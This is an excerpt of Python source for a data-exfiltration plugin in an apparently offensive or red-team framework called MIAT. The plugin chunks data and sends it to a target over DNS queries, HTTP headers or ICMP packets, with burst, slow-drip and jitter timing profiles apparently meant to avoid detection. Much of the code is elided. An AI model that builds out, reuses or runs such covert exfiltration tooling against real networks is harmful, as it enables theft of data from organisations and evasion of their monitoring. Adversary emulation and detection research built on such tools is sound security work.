...
#      "profile":      "burst",        # burst | slow_drip | jitter
#      "target":       "192.168.1.1",
...
class ExfilPlugin(MIATPlugin):
    ...
    async def execute(self, args: dict) -> None:
        ...
        if technique == 'http' and not REQUESTS_AVAILABLE:
            await self._emit(data={'error': 'pip install requests'}, success=False)
            return
        if technique == 'dns' and not DNS_AVAILABLE:
            await self._emit(data={'error': 'pip install dnspython'}, success=False)
            return
        if technique == 'icmp' and not SCAPY_AVAILABLE:
            await self._emit(data={'error': 'pip install scapy + Npcap (Windows)'}, success=False)
            return
        ...
        for i, chunk in enumerate(chunks, start=1):
            ...
            # Send via chosen technique
            if technique == 'dns':
                result = await loop.run_in_executor(
                    None, lambda c=chunk, seq=i: self._send_dns(
                        c, seq, session_id, dns_domain, dns_server
                    )
                )
            elif technique == 'http':
                result = await loop.run_in_executor(
                    None, lambda c=chunk, seq=i, hi=hdr_idx: self._send_http(
                ...
                result = await loop.run_in_executor(
                    None, lambda c=chunk, seq=i: self._send_icmp(c, seq, target)
                )
            else:
            ...
            # Live output
            desc = result.get('query_domain') or result.get('header_name') or target
            status = (
                result.get('outcome') or
                str(result.get('http_status', '')) or
                ('SENT' if result.get('sent') else 'ERR')
            )
            await self._emit_live(
    ...
    def _send_icmp(self, chunk: bytes, seq: int, target: str) -> dict:
        ...
        try:
            ...
            return {'error': 'Permission denied — run as Administrator/sudo', 'sent': False}
        except Exception as exc:
